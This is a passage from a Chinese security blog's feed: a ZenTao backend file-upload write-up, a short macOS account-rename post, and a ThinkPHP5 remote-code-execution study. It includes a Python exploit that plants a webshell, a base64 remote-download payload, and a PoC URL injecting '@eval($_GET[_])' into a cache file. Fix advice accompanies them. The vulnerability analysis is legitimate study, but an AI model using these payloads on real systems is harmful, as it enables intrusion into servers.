·GetShellï¼Œé—®é¢˜ä¸å¤§ã€‚</p><h2 id="åˆ©ç”¨æ–¹æ³•äºŒ"><a href="#åˆ©ç”¨æ–¹æ³•äºŒ" class="headerlink" title="åˆ©ç”¨æ–¹æ³•äºŒ"></a>åˆ©ç”¨æ–¹æ³•äºŒ</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;233&amp;link&#x3D;SFRUUDovLzE5Mi4xNjguMjI2LjEyOS9waHBpbmZvLnBocA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–¹æ³•äºŒå’Œæ–¹æ³•ä¸€çš„åŒºåˆ«å°±æ˜¯è·¯ç”±ã€‚ç¦…é“çš„ä¸¤ç§è·¯ç”±è§£ææ–¹å¼ã€‚</p><p>è¿™é‡Œçœ‹è¿™ä½å¸ˆå‚…çš„åˆ†ææ–‡ç« ï¼š</p><p><a href="https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>åˆ†æå®Œä¹‹åï¼Œä¸€å¥è¯æ€»ç»“æ¼æ´åŸç†ã€‚</p><blockquote><p>æºç æœªå¯¹è¿œç¨‹ä¸‹è½½çš„æ–‡ä»¶è¿›è¡Œæ‹“å±•ååˆæ³•æ€§æ ¡éªŒï¼Œifåˆ¤æ–­å¤§å†™ç»•è¿‡ï¼Œå¹¶ä¸”ä¸Šä¼ ä¹‹åçš„æ–‡ä»¶åè·¯å¾„å·²çŸ¥ï¼Œå¯¼è‡´GetShellã€‚</p></blockquote><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">usage = <span class="string">&quot;&quot;&quot;Usage example:</span></span><br><span class="line"><span class="string">python3  CNVD-C-2020-121325.py -t http://www.target.com -p 1 -rs remoteshell -m 1</span></span><br><span class="line"><span class="string">result maybe: http://www.target.com/www/data/client/1/phpinfo.php</span></span><br><span class="line"><span class="string">author: m0nk3y</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">2</span>]</span><br><span class="line">version = sys.argv[<span class="number">4</span>]</span><br><span class="line">remoteshell = sys.argv[<span class="number">6</span>]  <span class="comment"># your remote shell uri in base64encode format</span></span><br><span class="line">mode = sys.argv[<span class="number">8</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;www/client-download-&#123;&#125;-&#123;&#125;.html&#x27;</span>.format(version, remoteshell)</span><br><span class="line">payload2 = <span class="string">&#x27;www/index.php?m=client&amp;f=download&amp;version=&#123;&#125;&amp;link=&#123;&#125;&#x27;</span>.format(</span><br><span class="line">    version, remoteshell)</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=6d5fd22002d28df1a2001411a4d4e6d1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Edg/84.0.522.63&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">    target = target + payload1</span><br><span class="line">    print(target)</span><br><span class="line">r = requests.get(target, headers=header)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">2</span>:</span><br><span class="line">    target = target + payload2</span><br><span class="line">    print(target)</span><br><span class="line">    r = requests.get(target, headers=header)</span><br><span class="line">    print(r.text)</span><br><span class="line">    target = target + <span class="string">&quot;/www/data/client/&#123;&#125;/phpinfo.php&quot;</span>.format(version)</span><br><span class="line">    checker = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;phpinfo&#x27;</span> <span class="keyword">in</span> checker.text:</span><br><span class="line">        print(<span class="string">&quot;GetShell [+]!your webshell is:&#123;&#125;&quot;</span>.format(target))</span><br></pre></td></tr></table></figure><blockquote><p>å¾…å®Œå–„ã€‚</p></blockquote><p>å…¶å®æ„Ÿè§‰è¿™ä¸ªæ´ï¼Œå†™è„šæœ¬æ¯å•¥æ„æ€ï¼Œå› ä¸ºæœ¬æ¥å°±åœ¨åå°ä¸Šçš„ä¸œè¥¿ï¼Œä¹Ÿæ²¡åŠæ³•æ‰¹é‡ã€‚åœ¨æ»¡è¶³åˆ©ç”¨æ¡ä»¶çš„å‰æä¸‹ï¼Œæ‰‹åŠ¨å¤ç°ä¹Ÿå°±ä¸¤ä¸‰æ­¥å°±GetShelläº†ã€‚</p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><p>å‡çº§ç¦…é“åˆ°æœ€æ–°å®‰å…¨ç‰ˆæœ¬</p><p>AWDä¸­å¦‚ä½•ä¿®å¤ï¼šå‚è€ƒå®˜æ–¹çš„åšæ³•ï¼ŒåŠ ä¸€ä¸ªæ‰©å±•åæ£€éªŒã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://cert.360.cn/warning/detail?id=ace6901fc02100078ce586ffe53d4cfb">https://cert.360.cn/warning/detail?id=ace6901fc02100078ce586ffe53d4cfb</a></p><p><a href="https://co0ontty.github.io/2020/10/27/zentao.html">https://co0ontty.github.io/2020/10/27/zentao.html</a></p><p><a href="https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></p><p>éå¸¸æ¨èï¼š<a href="https://www.secpulse.com/archives/149812.html">https://www.secpulse.com/archives/149812.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¼æ´èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#æ¼æ´èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´èƒŒæ™¯&quot;&gt;&lt;/a&gt;æ¼æ´èƒŒæ™¯&lt;/h1&gt;&lt;p&gt;ç¦…é“æ˜¯ç¬¬ä¸€æ¬¾å›½äº§çš„å¼€æºé¡¹ç›®ç®¡ç†è½¯ä»¶ï¼Œå…¶ä½¿ç”¨zentaophpæ¡†æ¶å¼€å‘ï¼Œå†…ç½®äº†æµ‹è¯•ç®¡ç†ã€è®¡åˆ’ç®¡ç†ã€å‘å¸ƒç®¡ç†ã€æ–‡æ¡£ç®¡ç†ã€äº‹åŠ¡ç®¡ç†</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MacOS å¦‚ä½•ä¿®æ”¹è´¦æˆ·å</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰æ¿€æ´»MacBook Proçš„æ—¶å€™ï¼Œæœ¬æ¥æ‰“ç®—æ‹¿å›å®¶æ¿€æ´»çš„ï¼Œä½†æ˜¯å¤ªå¤é‡ŒAppleçš„äººå‘˜å¤ªçƒ­æƒ…å•¦ï¼Œæˆ‘å°±åœ¨å°å§å§å“ªé‡Œæ¿€æ´»äº†ï¼Œä¸€é¡¿ä¸‹ä¸€æ­¥ï¼Œå¯¼è‡´äº†æˆ‘çš„ç”¨æˆ·åæ˜¯æˆ‘çš„çœŸåã€‚æœ‰æ—¶å€™å†™ç¬”è®°ã€æ–‡ç« å•¥çš„ï¼Œæ€»æ„Ÿè§‰ä¸èˆ’æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>ç„¶åä¹‹å‰ä¸€ç›´æƒ³ä¿®æ”¹ï¼Œä½†æ˜¯å“ªé‡Œæ˜¯ç°è‰²çš„ï¼Œæ— æ³•ä¿®æ”¹ã€‚</p><p>ä¿®æ”¹åï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>ä¿®æ”¹æ–¹æ³•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>ç‚¹å‡»é”ï¼Œè¾“å…¥å¯†ç ä¹‹åå°±å¯ä»¥è¿›è¡Œæ“ä½œäº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>ç„¶åç‚¹å‡» + å·ï¼Œæ–°å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>é€€å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·ï¼ˆä¹Ÿæ˜¯å› ä¸ºå½“å‰è¿™ä¸ªç”¨æˆ·æ˜¯å¤„äºç™»å½•çŠ¶æ€ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ä¿®æ”¹account nameã€‚</li><li>ç™»å½•åˆ›å»ºçš„test ç®¡ç†å‘˜è´¦å·ï¼Œç›´æ¥è·³è¿‡Apple ID ä¹‹ç±»çš„è®¾ç½®ï¼Œç„¶åå»ä¿®æ”¹account nameã€‚</li><li>åˆ‡æ¢å›æ¥å°±OKäº†ã€‚</li><li>åˆ é™¤åˆ›å»ºçš„test ç®¡ç†å‘˜ç”¨æˆ·ã€‚</li></ul><p>åŸæ¥è¿™æ ·ç®€å•ã€‚</p><blockquote><p>å…¶å®å¾ˆå¤šäº‹æƒ…ï¼Œæˆ–è®¸éƒ½ç®€å•ï¼Œåªæ˜¯åœ¨äºè‡ªå·±æ„¿ä¸æ„¿æ„å»åšã€‚</p></blockquote><p>æœ€è¿‘ä¹Ÿæ˜¯å¿ƒç¥ä¸å®šçš„ï¼Œå¥½å¥½å­¦ä¹ å˜›ï¼Docker é€ƒé€¸å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡å¤ç°æˆåŠŸï¼Œæ·¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰æ¿€æ´»MacBook Proçš„æ—¶å€™ï¼Œæœ¬æ¥æ‰“ç®—æ‹¿å›å®¶æ¿€æ´»çš„ï¼Œä½†æ˜¯å¤ªå¤é‡ŒAppleçš„äººå‘˜å¤ªçƒ­æƒ…å•¦ï¼Œæˆ‘å°±åœ¨å°å§å§å“ªé‡Œæ¿€æ´»äº†ï¼Œä¸€é¡¿ä¸‹ä¸€æ­¥ï¼Œå¯¼è‡´äº†æˆ‘çš„ç”¨æˆ·åæ˜¯æˆ‘çš„çœŸåã€‚æœ‰æ—¶å€™å†™ç¬”è®°ã€æ–‡ç« å•¥çš„ï¼Œæ€»æ„Ÿè§‰ä¸èˆ’æœã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="æ‚ç¢" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2021-03-25T13:21:18.631Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸»è¦å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE"><a href="#RCE1-åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE" class="headerlink" title="RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)"></a>RCE1(åˆ©ç”¨ç¼“å­˜æ–‡ä»¶GetShellä»è€ŒRCE)</h1><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> çš„ç¼“å­˜ç±»ä¸­ã€‚è¯¥ç±»ä¼šå°†ç¼“å­˜æ•°æ®é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼ï¼Œç›´æ¥å­˜å‚¨åœ¨ <code>.php</code> æ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„ <strong>payload</strong> ï¼Œå³å¯å°† <strong>webshell</strong> å†™å…¥ç¼“å­˜æ–‡ä»¶ã€‚ç¼“å­˜æ–‡ä»¶çš„åå­—å’Œç›®å½•å‡å¯é¢„æµ‹å‡ºæ¥ï¼Œä¸€æ—¦ç¼“å­˜ç›®å½•å¯è®¿é—®æˆ–ç»“åˆä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå³å¯è§¦å‘ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> ã€‚</p></blockquote><p>æ¼æ´åˆ©ç”¨å‰æï¼š</p><ul><li><p>ç«™ç‚¹èƒ½å¤Ÿå°†ç¼“å­˜æ–‡ä»¶åˆ—å‡ºï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥å¾—åˆ°è·¯å¾„</p></li><li><p>1ã€ç¼“å­˜ä½¿ç”¨æ–‡ä»¶æ–¹å¼å¹¶ä¸”ç¼“å­˜ç›®å½•æš´éœ²åœ¨webç›®å½•ä¸‹é¢<br>2ã€æ”»å‡»è€…è¦èƒ½çŒœåˆ°å¼€å‘è€…ä½¿ç”¨çš„ç¼“å­˜key</p></li><li><p>çŸ¥é“ç¼“å­˜ç±»æ‰€è®¾ç½®çš„é”®åï¼Œè¿™æ ·æ‰èƒ½æ‰¾åˆ° <strong>webshell</strong> è·¯å¾„ï¼›å…¶æ¬¡å¦‚æœæŒ‰ç…§å®˜æ–¹è¯´æ˜å¼€å‘ç¨‹åºï¼Œ <strong>webshell</strong> æœ€ç»ˆä¼šè¢«å†™åˆ° <strong>runtime</strong> ç›®å½•ä¸‹ï¼Œè€Œå®˜æ–¹æ¨è <strong>public</strong> ä½œä¸º <strong>web</strong> æ ¹ç›®å½•ï¼Œæ‰€ä»¥å³ä¾¿æˆ‘ä»¬å†™å…¥äº† <strong>shell</strong> ï¼Œä¹Ÿæ— æ³•ç›´æ¥è®¿é—®åˆ°ï¼›æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></li><li><blockquote><p>5.0çš„éƒ¨ç½²å»ºè®®æ˜¯publicç›®å½•ä½œä¸ºwebç›®å½•è®¿é—®å†…å®¹ï¼Œå…¶å®ƒéƒ½æ˜¯webç›®å½•ä¹‹å¤–ï¼Œå½“ç„¶ï¼Œä½ å¿…é¡»è¦ä¿®æ”¹public/index.phpä¸­çš„ç›¸å…³è·¯å¾„</p></blockquote></li></ul><p>æ¯”å¦‚è¿™é‡Œä¿®æ”¹çš„index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨ThinkPHP çš„5.0.11 release ä¿¡æ¯ä¸­ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>æ›´æ–°äº†å®Œå–„ç¼“å­˜é©±åŠ¨(å®‰å…¨æ›´æ–°)ã€‚å†å»æŸ¥çœ‹commitè®°å½•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>ä¿®å¤æ–¹å¼ä¸ºå°†ç¼“å­˜æ–‡ä»¶çš„å†…å®¹æ‹¼æ¥åˆ°<code>&lt;?php ?&gt;</code> æ ‡ç­¾ä¹‹å¤–ï¼Œå¹¶ä¸”ä½¿ç”¨äº†<code>exit()</code>å‡½æ•°æ¥é€€å‡ºå½“å‰è„šæœ¬ã€‚</p><p>å¯ä¸‹æ–­ç‚¹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿæ•´ä¸ªå‚æ•°åœ¨Cacheç±»ä»¥åŠRequestç±»ä¸‹è¿›è¿‡ç›¸å…³æ–¹æ³•çš„è¿‡æ»¤ï¼Œè½¬æ¢ï¼Œå¹¶æœ€ç»ˆå†™å…¥äº†ç¼“å­˜æ–‡ä»¶çš„è¿‡ç¨‹ã€‚</p><p>é¦–å…ˆæ˜¯<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> æœªå®ä¾‹åŒ–ï¼Œæ‰€ä»¥ä¸ºè°ƒç”¨<code>autoload</code>æ–¹æ³•ï¼Œè‡ªåŠ¨åŠ è½½æœºåˆ¶æ¥è¿›è¡Œä¸€ç³»åˆ—å®ä¾‹åŒ–æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>ç„¶ååˆ°helper.php ä¸­çš„ <code>input</code>æ–¹æ³•ï¼Œåˆ¤æ–­è¯·æ±‚çš„æ–¹æ³•å’Œè¯·æ±‚çš„å‚æ•°ï¼Œæ­¤å¤„ä¸º<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>ç„¶åè¿”å›è¿‡æ»¤åçš„å€¼ï¼Œç»§ç»­è°ƒç”¨<code>Request</code> ç±»çš„ <code>get</code> æ–¹æ³•å’Œ <code>Input</code> æ–¹æ³•ï¼ˆåœ¨TP5)ä¸­å‚æ•°çš„å¤„ç†éƒ½æ˜¯è¿™æ ·çš„äº†ï¼Œ</p><p>ç»è¿‡<code>filterVaule</code>å’Œ<code>filterExp</code>å‡½æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤å’Œç›¸å…³åˆ¤æ®µåè¿”å›ç»™<code>$data</code></p><hr><p>ç„¶åæ¥åˆ°Cache ç±»çš„<code>set</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>è°ƒç”¨äº†Cache ç±»çš„init æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† Configé‡Œçš„getæ–¹æ³•ï¼Œè¿™äº›æ“ä½œæ˜¯åœ¨ä¸ºç¼“å­˜å†…å®¹åšä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ç„¶åå†åˆ°Cache ç±»çš„ connect æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>ä¸ºç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œmd5è¿”å›ã€‚è¿™é‡Œçš„<code>self::handler</code>ä¸º<code>think\cache\driver\File</code>ç±»ã€‚æ‰€ä»¥ä¼šè°ƒç”¨<code>File</code>ç±»çš„<code>set</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>getCacheKey</code>æ–¹æ³•æ¥è·å–ç¼“å­˜æ–‡ä»¶çš„æ–‡ä»¶åã€‚æ–‡ä»¶åçš„æœºåˆ¶å¦‚ä¸‹å›¾ï¼Œå…ˆæ˜¯å¯¹<code>$name</code> md5ï¼Œç„¶åæˆªå–å‰ä¸¤ä½ä½œä¸ºç›®å½•åï¼Œåé¢éƒ¨åˆ†ä½œä¸ºæ–‡ä»¶åç„¶åå’Œ<code>.php</code>åç¼€è¿›è¡Œæ‹¼æ¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>çœ‹çœ‹setæ–¹æ³•çš„å¤„ç†æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>æœ€åé€šè¿‡<code>file_put_contents</code>å‡½æ•°ï¼Œå°†<code>$data</code>ï¼ˆå‚æ•°å†…å®¹å¯æ§ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹dataå‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ç­‰æ“ä½œï¼Œåªæ˜¯åºåˆ—åŒ–åæ‹¼æ¥å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œè¿™é‡Œçš„ <strong>$this-&gt;options[â€˜data_compressâ€™]</strong> å˜é‡é»˜è®¤æƒ…å†µä¸‹ä¸º <strong>false</strong> ï¼Œæ‰€ä»¥æ•°æ®ä¸ä¼šç»è¿‡ <strong>gzcompress</strong> å‡½æ•°å¤„ç†ã€‚è™½ç„¶åœ¨åºåˆ—åŒ–æ•°æ®å‰é¢æ‹¼æ¥äº†å•è¡Œæ³¨é‡Šç¬¦ <strong>//</strong> ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥æ¢è¡Œç¬¦ç»•è¿‡è¯¥é™åˆ¶ã€‚ï¼‰ å†™å…¥<code>$filename</code>ä»è€ŒGetShellã€‚</p><blockquote><p>æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯(ä¹Ÿå°±æ˜¯ä¸Šä¸Šå›¾ä¸­çš„è®¾ç½®æ–‡ä»¶åå‰ç¼€çš„ä»£ç )ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></blockquote><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>1ï¼Œthinkphp3.2çš„ç‰ˆæœ¬è¯·é€‰æ‹©å¼€å¯ï¼šDATA_CACHE_KEY è¿™æ ·å°±ç®—ä½ ä½¿ç”¨çš„cmsæ˜¯å¼€æºçš„äººå®¶å‘ç°äº†è¿™ä¸ªä¹Ÿæ— æ³•ä½¿ç”¨ã€‚<br>2ï¼Œtp3.2-tp5  åšå¥½ç›®å½•æƒé™ï¼Œé™¤å…¬å…±ç›®å½•ç»å¯¹ä¸è¦è®©å¤–éƒ¨å¯è®¿é—®</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE"><a href="#RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE" class="headerlink" title="RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)"></a>RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)</h1><blockquote><p>æ§åˆ¶å™¨è¿‡æ»¤ä¸ä¸¥ï¼Œç»“åˆç›´æ¥è¿”å›ç±»åçš„ä»£ç æ“ä½œï¼Œå¯¼è‡´å¯ä»¥ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•</p></blockquote><p>è·å–å¤ç°ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹composer.json çš„  require å­—æ®µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 